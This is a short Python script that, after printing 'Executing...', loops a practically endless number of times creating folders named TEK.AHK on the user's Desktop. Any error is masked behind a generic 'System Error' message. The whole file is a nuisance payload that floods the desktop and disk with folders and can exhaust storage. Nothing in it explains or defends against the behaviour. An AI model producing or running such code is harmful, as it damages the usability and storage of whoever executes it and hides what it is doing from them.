import os
import time
import sys
from pathlib import Path


try:
    def FileStart():
        os.system("cls")
        print("Executing...")
        time.sleep(2)
        base_path = Path.home() / 'Desktop'
        for i in range(9999999999999999999999):
            folder_name = os.path.join(base_path, f"TEK.AHK_{i}")
            os.makedirs(folder_name)
            print(f"Created folder: {folder_name}")
    FileStart()
except (PermissionError,FileExistsError,Exception,ModuleNotFoundError):
    os.system("cls")
    print("System Error")
    sys.exit()